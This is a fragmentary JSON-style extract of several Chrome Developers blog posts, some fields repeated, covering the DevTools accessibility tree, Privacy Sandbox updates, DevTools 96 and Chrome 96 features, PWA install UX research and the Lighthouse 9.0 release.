reasons:\n\nIt makes it much simpler to handle node updates from the backend, since we have the same tree structure on both endpoints. For example, if the node B is removed in the example, we would receive an update for node X (since its children have changed), but if we had pruned that node we would struggle to figure out what to update.\nIt ensures that all DOM nodes have a corresponding accessibility node. When the tree is toggled, we select the node corresponding to the node currently selected in the DOM tree. So for the previous example, if the user toggles the tree while the DOM node corresponding to X is selected, we inject X between the nodes A and B and select X in the tree. This allows the user to inspect the accessibility node for all DOM nodes and help determine why the node is ignored.\n\n# Future ideas\nLaunching the new accessibility tree is just the start. We have a few ideas for future projects we could build on top of the new view, but we are also eager to hear your feedback!\n# Alternative filterings\nAs explained above, we currently filter out nodes that are deemed uninteresting. We could provide a way to disable this behavior and show all nodes, or provide alternative filterings such as Show landmark nodes or Show headings.\n# Highlight a11y issues\nWe could incorporate an “accessibility best practice” analysis with the tree and highlight accessibility issues directly on the offending nodes.\n# Surface accessibility actions in DevTools\nThe tree we currently show is purely one-way: It allows us to get an idea of what information would be fed to assistive technology when browsing a specific webpage. Accessibility actions represent the communication in the other direction: They allow assistive technology to act on the presented UI.

      "summary": "Welcome to the November edition of \"Progress in the Privacy\nSandbox,\" tracking the milestones on\nthe path to phasing out third-party cookies in Chrome and working towards a more\nprivate web. Each month we'll share an overview of the updates to the Privacy\nSandbox timeline along with news from\nacross the project. We've also provided an update on our Privacy Sandbox\ncommitments\nas we ensure proposals are designed, developed and implemented with regulatory\noversight and input from the UK’s Competition and Markets Authority (CMA) and\nInformation Commissioner's Office (ICO).\n\nAs we approach the end of the year there are fewer changes across the different\nproposals, so the update here is also lighter. However, this does mean it's a\ngood time for testing and addressing questions, which we are always happy to\nhear about either on the @ChromiumDev Twitter\nor the developer support\nrepo.\n\n# Events\nAt the beginning of November we hosted the Chrome Developer Summit, which\nincluded both a Privacy Sandbox segment in the keynote and a few related\nquestions in the Ask Me Anything (AMA) session. We've added a summary for\nyou to read or watch that covers\nactivities and examples of what to expect as proposals progress through the\ndiscussion, testing, and scaled adoption phases.\n\n  \n\n# Strengthen cross-site privacy boundaries\nThird-party cookies are a key mechanism that enables cross-site tracking.\nPhasing them out is a major milestone, but we also need to tackle other forms of\ncross-site storage or communication.\n# Federated Credentials Management API\nFederated Credentials Management (FedCM) is\nthe new, more meaningful name for the WebID proposal.  We've reflected this\nchange in the Privacy Sandbox Timeline.\nFederated identity is a critical service for the web, but given that it's\nexplicitly used to share aspects of identity across other sites, there are\nimplementation details which overlap with cross-site tracking.\nThe Federated Credentials Management proposal explores a range of options: from\nsimple migration paths for existing solutions to more private methods of\nconnecting to services with the bare minimum of information shared.\nNovember also included the bi-annual\nBlinkOn conference. Blink is\nthe rendering engine used by Chromium, and BlinkOn is where contributors gather\nfor engineering presentations and discussions on current projects. The November\nBlinkOn included an overview and Q&A session on FedCM: you can watch the\nrecording on YouTube.\n# Preventing covert tracking\nAs we reduce the options for explicit cross-site tracking, we also need to\naddress the areas of the web platform that expose identifying information which\nenables fingerprinting or covert tracking of users.\n# User-Agent string reduction and User-Agent Client Hints\nProgress continues on reducing the information available by default in Chrome's\nUser-Agent string and providing an improved, active method for requesting that\ndata via User-Agent Client Hints. We've added a new User-Agent\nReduction overview to collate all the\ncurrent guidance and updates.\nWe published new testing resources to help prepare for the changes. The\nUser-Agent reduction code\nsnippets provide a selection of\nexamples for transforming the current Chrome User-Agent string to the reduced\nformat. There is also the new chrome://flags/#force-major-version-to-100 entry\nwhich will let you check if the switch to a 3 digit major version causes your\nsite to malfunction or break.\nWe have published the Intent to Ship for\nSec-CH-UA-Full-Version-List.\nThis addresses ecosystem\nfeedback that the existing\nSec-CH-UA-Full-Version was too tightly bound to the primary browser brand as it\nonly provided a single value. For example, the current implementation shows:\n⬇️ Server response header\nAccept-CH: Sec-CH-UA-Full-Version\n⬆️ Browser request header\nSec-CH-UA: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"Sec-CH-UA-Full-Version: \"94.0.4606.124\"\nThe updated version would provide:\n⬇️ Server response header\nAccept-CH: Sec-CH-UA-Full-Version-List\n⬆️ Browser request header\nSec-CH-UA: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \"Other browser\";v=\"99\"Sec-CH-UA-Full-Version-List: \"Chromium\";v=\"94.0.4606.124\", \"Google Chrome\";v=\"94.0.4606.124\", \"Other browser\";v=\"99.88.77.66\"\n\nIf you are using Sec-CH-UA-Full-Version then you should plan to migrate to\nSec-CH-UA-Full-Version-List as it will allow us to deprecate\nSec-CH-UA-Full-Version in the future.\n\n# IP blindness\nIP addresses by their nature often provide a unique identifier for a client\nenabling the necessary communication between browser and server. However, this\nalso means that a stable IP address over time passively provides a significant\namount of information that can be used for cross-site tracking.\nThe IP blindness proposal (also\nknown as Global Network Address Translation Combined with Audited and Trusted\nCDN or HTTP-Proxy Eliminating Reidentification or Gnatcatcher) details a two\npronged approach to addressing this issue. The first is Near-Path\nNAT\nwhich effectively forwards the browser's connection through an IP privatizing\nservice which hides the browser's IP address from the site being visited. The\nsecond option builds on the layered nature of the Internet where the\ninfrastructure that relies on IP address can be wholly separate from the\napplication running on top of it. The Willful IP\nBlindness\nproposal explores methods of defining auditable policies for creating and\nmaintaining that separation.\nBoth of these ideas are early in the discussion phase with active progress in\nthe repo, such as the recently posted Willful IP Blindness\nPrinciples.\nYou can expect to see discussion continue there and if you're interested in the\nnetwork-level details, you can follow the Multiplexed Application Substrate\nover QUIC Encryption (MASQUE)\nWorking Group in the IETF.\n# Measure digital ads\nAs the companion to displaying ads without cross-site tracking, we need\nprivacy-preserving mechanisms to allow measurement of ad effectiveness.\n# Attribution Reporting API\nThe Attribution Reporting\nAPI creates functionality to\nmeasure events on one site, like clicking or viewing an ad, that lead to a\nconversion on another site—without enabling cross-site tracking.\nWe continue to test the API and the origin trial has been\nextended\nthrough to Chrome 97. Current origin trial tokens expired on October 12th, so\nexisting testers need to apply for updated tokens to continue testing.\nThere are two new blog posts up with the latest details on event-level reporting\nin the API. Event-level reports in the Attribution Reporting\nAPI\nintroduces the concepts and process while Using event-level reports in the\nAttribution Reporting\nAPI goes into the\nimplementation detail with accompanying demo and demo code.\n# Feedback\nAs we continue to publish these monthly updates, and progress through the\nPrivacy Sandbox as a whole, we want to make sure that developers receive the\ninformation and support that they need. Let us know on @ChromiumDev\nTwitter if there's anything that we could\nimprove in this series. We'll use your input to continue improving the format.\nCheck out the Privacy Sandbox FAQ, which we\ncontinue to expand based on the issues you submit to the developer support\nrepo. If you\nhave any questions around testing or implementation on any of the proposals,\ncome talk to us there.",

Sign up to participate in Google User Research here.\n\n\n  \n\n# Preview feature: New Recorder panel\nUse the new Recorder panel to record, replay and measure user flows.\nOpen the Recorder panel. Follow the instructions on screen to start a new recording.\nFor example, you can record the coffee checkout process with this coffee ordering demo application. After adding a coffee and filling out payment details, you can end the recording, replay the process or click on the Measure performance button to measure the user flow in the Performance panel.\nGo to the Recorder panel documentation to learn more with the step-by-step tutorial!\nThe Recorder panel is a preview feature. Our team is still actively working on it and we are looking for your feedback for further enhancements.\n\nChromium issue: 1257499\n# Refresh device list in Device Mode\nEnabling the Device Toolbar, more modern devices are now added in the device list. Select a device to simulate its dimensions.\n\nChromium issue: 1223525\n# Autocomplete with Edit as HTML\nThe Edit as HTML UI now supports autocomplete and syntax highlights. In the Elements panel, right click on an element, and select  Edit as HTML. Try typing a DOM property (e.g. id, aria), the autocomplete should help you find the property name you're looking for.\n\nChromium issue: 1215072\n# Improved code debugging experience\nColumn numbers are now included in the output error in the Console. Having easy access to the column number is essential for debugging especially with minified JavaScript.\n\nChromium issue: 1073064\n# [Experimental] Syncing DevTools settings across devices\nYour DevTools settings are now synced across devices by default when you turn on Chrome profile sync. You can change the DevTools sync settings via Settings > Sync > Enable settings sync.\n\nThis new setting makes it easier for you to work across devices. For example, the following appearance settings are synced so you have a consistent experience across devices and don’t need to re-define the same settings again. Learn more about the sync feature in DevTools customization.\n\nThis feature is experimental at the moment, the team is still actively working on it. If you have any feedback, please share with us here.\nChromium issue: 1245541\n# Download the preview channels\nConsider using the Chrome Canary, Dev or Beta as your default development browser. These preview channels give you access to the latest DevTools features, test cutting-edge web platform APIs, and find issues on your site before your users do!\n# Getting in touch with the Chrome

Sign up to participate in Google User Research here.\n\n\n  \n\n# Preview feature: New Recorder panel\nUse the new Recorder panel to record, replay and measure user flows.\nOpen the Recorder panel. Follow the instructions on screen to start a new recording.\nFor example, you can record the coffee checkout process with this coffee ordering demo application. After adding a coffee and filling out payment details, you can end the recording, replay the process or click on the Measure performance button to measure the user flow in the Performance panel.\nGo to the Recorder panel documentation to learn more with the step-by-step tutorial!\nThe Recorder panel is a preview feature. Our team is still actively working on it and we are looking for your feedback for further enhancements.\n\nChromium issue: 1257499\n# Refresh device list in Device Mode\nEnabling the Device Toolbar, more modern devices are now added in the device list. Select a device to simulate its dimensions.\n\nChromium issue: 1223525\n# Autocomplete with Edit as HTML\nThe Edit as HTML UI now supports autocomplete and syntax highlights. In the Elements panel, right click on an element, and select  Edit as HTML.

      "summary": "# Introduction\nAt the beginning of 2020, the Chrome team across mobile and desktop\nlaid out a plan to improve the discoverability and engagement of\ninstalled web apps. Our work led to a greater than 100% increase in\nPWA installation and engagement. We achieved this by researching\nexisting features, running A/B test experiments and user interviews\nto gain insight into users perceptions and expectations. This article\ncovers how we got there.\n# Unified install language\nThe call-to-action that triggers a PWA install was inconsistent across\nthe web platform. For Chrome on Android, we had settled on Add to\nhome screen, but on our Desktop Platforms, we\nemphasized Install. The rationale for this discrepancy came from\na study the team ran in 2016 that compared different strings. The\nteam found that Add to home screen worked better, if only\nmarginally, on mobile.\nA further study on taxonomy in 2019 found no difference, and so the\nteam wanting to unify the PWA install experience, decided to update\nthe label to Install on Android. A further study in 2021 compared\nthe language, Install, Get, and Download, and we found\nthat users understood Install as the process that was happening.\nUsers felt tapping a button with the label Get would send the user\nto a website, and with Download they assumed a file would end up\nin their downloads folder or equivalent.\nWith all this in mind, we concluded that the label Install best\nfits PWAs. We recommend developers across the web platform adopt\nInstall as the preferred string going forward.\n# Install icon on desktop\nOn our desktop platforms, we have a design pattern that whenever a website\nloads a PWA, Chrome will show a pill that appears on the right-hand side of the\nomnibox that contains an icon and the label Install. After\nthat, when a user visits a site, only the icon will be present.\nClicking on this pill triggers the installation of a desktop\nPWA.\n\n\n\nOriginal install plus icon.\n\n\nThe icon was initially a plus symbol, partly due to the Add to home\nscreen metaphor used on mobile. However, as mentioned, the language\nwe used was Install. The feedback we received from the developer\ncommunity was that this icon was confusing. Furthermore, if a user\nused the zoom function to enlarge text, the icon for zoom looked very\nsimilar, confusing the user even more.\n\n\n\nOmnibox bug with zoom and install icons present.\n\n\nI decided to investigate our user's perception, as most feedback was\nanecdotal. Working with our UX researchers, we ran a study with\n10,000 users in the USA and Indonesia to determine users'\nunderstanding of install iconography. We tested five different\ndesigns, including the existing one, and asked users what \"Install\"\nmeant. We discovered that the current icon, the plus symbol, was the\nmost confusing to our users. Many confused the symbol\nwith \"medicine\", \"first aid\" and \"batteries\".\nWe also found that users primarily associated imagery such as arrows\nand devices with the install. Based on these conclusions, we ran an\nA/B/C test in Chrome, comparing the existing design with two\nalternatives. We landed on the arrow pointing down into a monitor,\nwhich performed significantly better than the other two. We also saw\na decrease in dismissals of the install UI with this new icon.\n\n\n\nVariants of our install iconography that you can download from our \nMaterial Design icon set.\n\n\nThe outcome is the design you see today, which has seen the install\nrate for PWAs more than double for websites. We have also added this\nicon and a mobile equivalent to our Material Design icon set,\nenabling the community to use the iconography that we found most\nengaging.\nOf course, a single icon will not change the world, which leads us to\nour next feature.\n# In-product help \nIn-Product Help is a blue bubble tooltip that onboards users on new\nfeatures that may interest them based on specific criteria. We\ndecided to launch this design pattern to inform users about the\ninstall features and further support the new icon redesign.\n\n\n\nIn-product help tooltip bubble that educates users about features.\n\n\nWhen a user visits a website regularly, Chrome uses a service known\nas Site Engagement.\nThis provides information about how engaged a user is with a site. By\nvisiting chrome://site-engagement/, you can see the sites that you\nare engaging with regularly. Using these scores, we could determine\nif a user is interested in a website. If the site was a PWA and the\nuser was engaged we would show them the install In-Product Help UI.\nThis meant that we only focused on engaged users and not annoy users\nwho may visit a site one time.\nBy using in-product help on desktop, we saw a greater than 100%\nincrease in PWA installation, showing that focusing on engaged users\nimproved the installability of web apps.\n# Richer Install UI\nThe install paradigm for most users is a store.\nSince the mid-2000's we have educated users that whenever they are\ninstalling an app, they will see a description, screenshots, and\nother metadata to help them decide if an app is something they\nwant.\nWith PWAs, the UI we showed once a user had decided to install a web\napp was relatively meager. So the team decided to explore a richer\ninstall experience that would give context to our users about the web\napp and enable developers to celebrate the PWA's that were on par\nwith native experiences.\n\n\n\nRicher Install UI, collapsed and expanded states.\n\n\nEarlier this year, we launched Richer Install,\nan extended install UI on Chrome on Android that allows developers to\nadd screenshots to their manifest. Developers can also add a\ndescription, which is recommended but not necessary. Due to this\nnewer UI, we saw an install rate for some PWAs double, showing that\nusers have greater confidence in installing web apps when we give\nmore context and richer experiences.. The desktop version of this UI\nis currently a work in progress.\n# Conclusion\nThe team has spent the last two years exploring and\nexperimenting with newer features in Chrome that have enabled and\nempowered PWA developers and helped to educate users about the\nbenefits of web experiences. There is still plenty of work we can\ndo, but collectively we can improve and enrich our users' lives\nand further support the open web.",

      "content_text": "# Introduction\nAt the beginning of 2020, the Chrome team across mobile and desktop\nlaid out a plan to improve the discoverability and engagement of\ninstalled web apps. Our work led to a greater than 100% increase in\nPWA installation and engagement. We achieved this by researching\nexisting features, running A/B test experiments and user interviews\nto gain insight into users perceptions and expectations. This article\ncovers how we got there.\n# Unified install language\nThe call-to-action that triggers a PWA install was inconsistent across\nthe web platform. For Chrome on Android, we had settled on Add to\nhome screen, but on our Desktop Platforms, we\nemphasized Install. The rationale for this discrepancy came from\na study the team ran in 2016 that compared different strings. The\nteam found that Add to home screen worked better, if only\nmarginally, on mobile.\nA further study on taxonomy in 2019 found no difference, and so the\nteam wanting to unify the PWA install experience, decided to update\nthe label to Install on Android. A further study in 2021 compared\nthe language, Install, Get, and Download, and we found\nthat users understood Install as the process that was happening.\nUsers felt tapping a button with the label Get would send the user\nto a website, and with Download they assumed a file would end up\nin their downloads folder or equivalent.\nWith all this in mind, we concluded that the label Install best\nfits PWAs. We recommend developers across the web platform adopt\nInstall as the preferred string going forward.\n# Install icon on desktop\nOn our desktop platforms, we have a design pattern that whenever a website\nloads a PWA, Chrome will show a pill that appears on the right-hand side of the\nomnibox that contains an icon and the label Install. After\nthat, when a user visits a site, only the icon will be present.\nClicking on this pill triggers the installation of a desktop\nPWA.\n\n\n\nOriginal install plus icon.\n\n\nThe icon was initially a plus symbol, partly due to the Add to home\nscreen metaphor used on mobile. However, as mentioned, the language\nwe used was Install. The feedback we received from the developer\ncommunity was that this icon was confusing. Furthermore, if a user\nused the zoom function to enlarge text, the icon for zoom looked very\nsimilar, confusing the user even more.\n\n\n\nOmnibox bug with zoom and install icons present.\n\n\nI decided to investigate our user's perception, as most feedback was\nanecdotal. Working with our UX researchers, we ran a study with\n10,000 users in the USA and Indonesia to determine users'\nunderstanding of install iconography. We tested five different\ndesigns, including the existing one, and asked users what \"Install\"\nmeant. We discovered that the current icon, the plus symbol, was the\nmost confusing to our users. Many confused the symbol\nwith \"medicine\", \"first aid\" and \"batteries\".\nWe also found that users primarily associated imagery such as arrows\nand devices with the install. Based on these conclusions, we ran an\nA/B/C test in Chrome, comparing the existing design with two\nalternatives. We landed on the arrow pointing down into a monitor,\nwhich performed significantly better than the other two. We also saw\na decrease in dismissals of the install UI with this new icon.\n\n\n\nVariants of our install iconography that you can download from our \nMaterial Design icon set.\n\n\nThe outcome is the design you see today, which has seen the install\nrate for PWAs more than double for websites. We have also added this\nicon and a mobile equivalent to our Material Design icon set,\nenabling the community to use the iconography that we found most\nengaging.\nOf course, a single icon will not change the world, which leads us to\nour next feature.\n# In-product help \nIn-Product Help is a blue bubble tooltip that onboards users on new\nfeatures that may interest them based on specific criteria. We\ndecided to launch this design pattern to inform users about the\ninstall features and further support the new icon redesign.\n\n\n\nIn-product help tooltip bubble that educates users about features.\n\n\nWhen a user visits a website regularly, Chrome uses a service known\nas Site Engagement.\nThis provides information about how engaged a user is with a site. By\nvisiting chrome://site-engagement/, you can see the sites that you\nare engaging with regularly. Using these scores, we could determine\nif a user is interested in a website. If the site was a PWA and the\nuser was engaged we would show them the install In-Product Help UI.\nThis meant that we only focused on engaged users and not annoy users\nwho may visit a site one time.\nBy using in-product help on desktop, we saw a greater than 100%\nincrease in PWA installation, showing that focusing on engaged users\nimproved the installability of web apps.\n# Richer Install UI\nThe install paradigm for most users is a store.\nSince the mid-2000's we have educated users that whenever they are\ninstalling an app, they will see a description, screenshots, and\nother metadata to help them decide if an app is something they\nwant.\nWith PWAs, the UI we showed once a user had decided to install a web\napp was relatively meager. So the team decided to explore a richer\ninstall experience that would give context to our users about the web\napp and enable developers to celebrate the PWA's that were on par\nwith native experiences.\n\n\n\nRicher Install UI, collapsed and expanded states.\n\n\nEarlier this year, we launched Richer Install,\nan extended install UI on Chrome on Android that allows developers to\nadd screenshots to their manifest. Developers can also add a\ndescription, which is recommended but not necessary. Due to this\nnewer UI, we saw an install rate for some PWAs double, showing that\nusers have greater confidence in installing web apps when we give\nmore context and richer experiences.. The desktop version of this UI\nis currently a work in progress.\n# Conclusion\nThe team has spent the last two years exploring and\nexperimenting with newer features in Chrome that have enabled and\nempowered PWA developers and helped to educate users about the\nbenefits of web experiences. There is still plenty of work we can\ndo, but collectively we can improve and enrich our users' lives\nand further support the open web.",

      "summary": "\n  \n\nHere's what you need to know:\n\nThe manifest id property lets you specify a unique ID for\nyour PWA.\nThe protocol_handlers property allows you to\nautomatically register your PWA as a protocol handler upon installation.\nThe priority hints origin trial allows you to specify\npriority hints for downloading resources.\nYou can force the Chrome version to 100 to test how your code\nwill react to a three digit version number.\nVideos from the Chrome Dev Summit are all online.\nAnd there's plenty more.\n\nI'm Pete LePage, finally shooting\nin the studio, let's dive in and see what's new for developers in Chrome 96.\n# Manifest id for PWAs\nWhen a user installs a PWA, the browser needs a way to uniquely identify it.\nBut, until recently, the web app manifest spec didn't specify how to identify\na PWA, leaving browsers to decide, and leading to different implementations.\nIn some browsers, the start_url is used, while in others, the path to the\nmanifest file is used.\nThat makes it impossible to change either of those fields without breaking the\ninstall experience. Now, there's a new optional id property, that allows\nyou to explicitly define the identifier used for your PWA.\nAdding the id property to the manifest removes the dependency on the\nstart_url or the location of the manifest, and makes it possible for those\nfields to be updated.\n{  ...  id: \"/?homescreen=1\",  start_url: \"/?homescreen=1\",  ...}\nSupport for the id property lands in desktop Chromium-based browsers\nstarting in Chrome 96. Support for mobile, which currently uses the manifest\nurl as the unique ID, should land in the first half of 2022.\n\nIf you already have a PWA in production and want to add an id to your\nmanifest, you'll need to use the ID that was assigned by the browser. You can\nfind the id in the Manifest pane of the Application panel in Dev Tools.\n\nFor a brand new PWA, you can set the id to any string value you like, but\nremember, you won't be able to change it in the future, so choose wisely.\n{  ...  id: \"SquooshApp\",  start_url: \"/?homescreen=1\",  ...}\nCheck out Uniquely identifying PWAs with the web app manifest id property\nfor more info.\n# URL protocol handlers for PWAs\nWeb apps can use navigator.registerProtocolHandler() to\nregister as a protocol handler. For example, Gmail can register the mailto\nprotocol. Then when a user clicks on a link with the mailto: prefix, Gmail\nwill open, making it easy for the user to send an email.\nStarting in Chrome 96, a PWA can register as a protocol handler as part of its\ninstallation. To do that for your PWA, add a protocol_handlers property to\nyour web app manifest, specify the protocol you want to handle, and the\nurl that should be opened when clicked.\n  ...  \"protocol_handlers\": [    {      \"protocol\": \"web+tea\",      \"url\": \"/tea?type=%s\"    },    {      \"protocol\": \"web+coffee\",      \"url\": \"/coffee?type=%s\"    }  ]}\nThere are some restrictions here, and you can't just register any protocol, so\ncheck out URL protocol handler registration for PWAs for complete\ndetails, and how you can use the web+ syntax to create your own protocols!\n# Priority hints (origin trial)\nWhen a browser parses a web page and begins to discover and download resources\nsuch as images, scripts, or CSS, it assigns them a fetch priority to try to\noptimize the page load. Browsers are pretty good at assigning priorities, but\nmay not be optimal in all cases.\nPriority Hints are an experimental feature, available as an\norigin trial starting in Chrome 96, and can help optimize the Core\nWeb Vitals. The importance attribute allows you to specify the priority\nfor resource types such as CSS, fonts, scripts, images, and iframes.\n<!-- We don't want a high priority for this above-the-fold image --><img src=\"/not-important.svg\" importance=\"low\"><!-- Initiate an early fetch for a resource, but de-prioritize it --><link rel=\"preload\" href=\"/script.js\" as=\"script\" importance=\"low\"><script>  fetch('https://example.com/', {importance: 'high'})      .then(data => {        // Trigger a high priority fetch      });</script>\nFor example, here's the Google Flights page. That background image is the\nlargest contentful paint (LCP).\n\nLet's see it loaded with, and without priority hints. With the priority set\nto high on the background image, the LCP drops from 2.6 seconds to 1.9\nseconds.\n          \nCheck out Optimizing resource loading with Priority Hints for\nall the details, how to register for the origin trial, and some great examples\nof how it can help to improve your rendering performance.\n# Emulate Chrome 100 in the UA string\nEarly next year, we'll hit Chrome 100, a three digit version number. Any\ncode that checks version numbers, or parses the UA string, should be checked\nto make sure it handles three digits.\nStarting in Chrome 96, there's a new flag #force-major-version-to-100 that\nwill change the current version number to 100, so you can make sure\neverything works as expected.\n\nFor details see Force Chrome major version to 100 in the User-Agent string.\n# Chrome Dev Summit\nChrome Dev Summit is a wrap. All of the videos and content are available\nonline. Check out the Chrome Dev Summit site, or if you missed\nthe keynote or livestream, check out the CDS Playlist on the\nChrome Developers YouTube Channel.\n# And more!\nOf course there's plenty more.\n\nThe Back, forward cache – or bfcache – is now available in stable, and\nbrings Chrome in line with both Firefox and Safari.\n\n# Further reading\nThis covers only some of the key highlights. Check the links below for\nadditional changes in Chrome 96.\n\nWhat's new in Chrome DevTools (96)\nChrome 96 deprecations and removals\nChromeStatus.com updates for Chrome 96\nWhat's new in JavaScript in Chrome 96\nChromium source repository change list\nChrome release calendar\n\n# Subscribe\nTo stay up to date, subscribe\nto Chrome Developers YouTube channel,\nand you'll get an email notification whenever we launch a new video.\nI'm Pete LePage, and as soon as Chrome 97 is released, I'll be right here to\ntell you what's new in Chrome!",

      "content_text": "\n  \n\nHere's what you need to know:\n\nThe manifest id property lets you specify a unique ID for\nyour PWA.\nThe protocol_handlers property allows you to\nautomatically register your PWA as a protocol handler upon installation.\nThe priority hints origin trial allows you to specify\npriority hints for downloading resources.\nYou can force the Chrome version to 100 to test how your code\nwill react to a three digit version number.\nVideos from the Chrome Dev Summit are all online.\nAnd there's plenty more.\n\nI'm Pete LePage, finally shooting\nin the studio, let's dive in and see what's new for developers in Chrome 96.\n# Manifest id for PWAs\nWhen a user installs a PWA, the browser needs a way to uniquely identify it.\nBut, until recently, the web app manifest spec didn't specify how to identify\na PWA, leaving browsers to decide, and leading to different implementations.\nIn some browsers, the start_url is used, while in others, the path to the\nmanifest file is used.\nThat makes it impossible to change either of those fields without breaking the\ninstall experience. Now, there's a new optional id property, that allows\nyou to explicitly define the identifier used for your PWA.\nAdding the id property to the manifest removes the dependency on the\nstart_url or the location of the manifest, and makes it possible for those\nfields to be updated.\n{  ...  id: \"/?homescreen=1\",  start_url: \"/?homescreen=1\",  ...}\nSupport for the id property lands in desktop Chromium-based browsers\nstarting in Chrome 96. Support for mobile, which currently uses the manifest\nurl as the unique ID, should land in the first half of 2022.\n\nIf you already have a PWA in production and want to add an id to your\nmanifest, you'll need to use the ID that was assigned by the browser. You can\nfind the id in the Manifest pane of the Application panel in Dev Tools.\n\nFor a brand new PWA, you can set the id to any string value you like, but\nremember, you won't be able to change it in the future, so choose wisely.\n{  ...  id: \"SquooshApp\",  start_url: \"/?homescreen=1\",  ...}\nCheck out Uniquely identifying PWAs with the web app manifest id property\nfor more info.\n# URL protocol handlers for PWAs\nWeb apps can use navigator.registerProtocolHandler() to\nregister as a protocol handler. For example, Gmail can register the mailto\nprotocol. Then when a user clicks on a link with the mailto: prefix, Gmail\nwill open, making it easy for the user to send an email.\nStarting in Chrome 96, a PWA can register as a protocol handler as part of its\ninstallation. To do that for your PWA, add a protocol_handlers property to\nyour web app manifest, specify the protocol you want to handle, and the\nurl that should be opened when clicked.\n  ...  \"protocol_handlers\": [    {      \"protocol\": \"web+tea\",      \"url\": \"/tea?type=%s\"    },    {      \"protocol\": \"web+coffee\",      \"url\": \"/coffee?type=%s\"    }  ]}\nThere are some restrictions here, and you can't just register any protocol, so\ncheck out URL protocol handler registration for PWAs for complete\ndetails, and how you can use the web+ syntax to create your own protocols!\n# Priority hints (origin trial)\nWhen a browser parses a web page and begins to discover and download resources\nsuch as images, scripts, or CSS, it assigns them a fetch priority to try to\noptimize the page load. Browsers are pretty good at assigning priorities, but\nmay not be optimal in all cases.\nPriority Hints are an experimental feature, available as an\norigin trial starting in Chrome 96, and can help optimize the Core\nWeb Vitals. The importance attribute allows you to specify the priority\nfor resource types such as CSS, fonts, scripts, images, and iframes.\n<!-- We don't want a high priority for this above-the-fold image --><img src=\"/not-important.svg\" importance=\"low\"><!-- Initiate an early fetch for a resource, but de-prioritize it --><link rel=\"preload\" href=\"/script.js\" as=\"script\" importance=\"low\"><script>  fetch('https://example.com/', {importance: 'high'})      .then(data => {        // Trigger a high priority fetch      });</script>\nFor example, here's the Google Flights page. That background image is the\nlargest contentful paint (LCP).\n\nLet's see it loaded with, and without priority hints. With the priority set\nto high on the background image, the LCP drops from 2.6 seconds to 1.9\nseconds.\n          \nCheck out Optimizing resource loading with Priority Hints for\nall the details, how to register for the origin trial, and some great examples\nof how it can help to improve your rendering performance.\n# Emulate Chrome 100 in the UA string\nEarly next year, we'll hit Chrome 100, a three digit version number. Any\ncode that checks version numbers, or parses the UA string, should be checked\nto make sure it handles three digits.\nStarting in Chrome 96, there's a new flag #force-major-version-to-100 that\nwill change the current version number to 100, so you can make sure\neverything works as expected.\n\nFor details see Force Chrome major version to 100 in the User-Agent string.\n# Chrome Dev Summit\nChrome Dev Summit is a wrap. All of the videos and content are available\nonline. Check out the Chrome Dev Summit site, or if you missed\nthe keynote or livestream, check out the CDS Playlist on the\nChrome Developers YouTube Channel.\n# And more!\nOf course there's plenty more.\n\nThe Back, forward cache – or bfcache – is now available in stable, and\nbrings Chrome in line with both Firefox and Safari.\n\n# Further reading\nThis covers only some of the key highlights.

      "summary": "Lighthouse is a website auditing tool that helps developers with opportunities and diagnostics to improve the user experience of their sites.\nLighthouse 9.0 is available immediately on the command line, in Chrome Canary, and in PageSpeed Insights. It will land in Chrome stable in Chrome 98.\n# API changes\nMost users should not run into any workflow-breaking changes with this release. If you run custom Lighthouse audits or use tools that depend on details deep in the Lighthouse report JSON, there may be some breaking changes in 9.0 that you need to be aware of.\nSee the full list of changes in the 9.0 changelog.\n# Lighthouse for user flows\nLighthouse has a new user-flow API that allows lab testing at any point within a page's lifespan.\nPuppeteer is used to script page loads and trigger synthetic user interactions, and Lighthouse can be invoked in multiple ways to capture key insights during those interactions. This means that performance can be measured during page load and during interactions with the page.\n\nFor more information, see the Lighthouse user flows tutorial and code samples.\n# Report refresh\nThe Lighthouse report has been refreshed to improve readability and make the source of the report and how it was run clearer.\nA final screenshot has been embedded at the top of the report to make it obvious at a glance if the page being tested loaded correctly and is in the format expected.\n\nThe summary information at the bottom of the report has also been redesigned to better communicate how Lighthouse was run and the report collected.\n\nTo see the new report in action, try out Lighthouse 9.0 or visit this example report.\n# Related accessibility elements\nA common accessibility problem is when things that are supposed to be unique in a page are not, for instance if the id referenced in a aria-labelledby attribute is used on multiple elements.\nLighthouse has always warned about this situation, but would only list the first instance of an element with a repeated ID, which often caused confusion because some users would assume it was showing all elements causing an issue. Since Lighthouse was only showing a single element, they'd assume it was a bug that the single element was being flagged as a duplicate.\nIn Lighthouse 9.0, all the elements sharing that ID are now listed:\n\nThis \"related nodes\" functionality is provided by axe-core, so it may appear in other accessibility audits as well.\nFor more information, see the issue collecting user reports and the implementation pull request.\n# Running Lighthouse\nLighthouse is available in Chrome DevTools, npm (as a Node module and a CLI), and as a browser extension (in Chrome and Firefox). It powers many Google services, including web.dev/measure and PageSpeed Insights.\nTo try the Lighthouse Node CLI, use the following commands:\nnpm install -g lighthouselighthouse https://www.example.com --view\n# Get in touch with the Lighthouse team\nTo discuss the new features, changes in the 9.0 release, or anything else related to Lighthouse:\n\nReport an issue or submit feedback in the Lighthouse GitHub issue tracker.\nAsk questions in the Lighthouse GitHub discussion forums.\nReach out to the Lighthouse team on Twitter @____lighthouse.\n",

